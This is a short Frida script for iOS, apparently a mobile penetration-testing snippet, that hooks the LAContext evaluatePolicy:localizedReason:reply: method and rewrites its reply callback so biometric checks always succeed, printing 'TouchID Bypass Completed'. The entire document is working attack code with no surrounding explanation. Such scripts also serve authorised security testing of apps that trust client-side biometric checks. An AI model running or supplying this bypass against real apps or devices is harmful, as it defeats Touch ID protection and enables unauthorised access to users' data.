if (ObjC.available)
    try
    {
        Interceptor.attach(ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"].implementation, {
		onEnter: function(args) {
		console.log("\n[*] Hooking LAContext");
        var reply = new ObjC.Block(args[4]);
        const replyCallback = reply.implementation;
        reply.implementation = function (error, value)  {
            return replyCallback(1, null);
        };
	console.log("[-] TouchID Bypass Completed ");
    },
});
    }
    catch(err)
    {
        console.log("[!] Exception: " + err.message);
    }
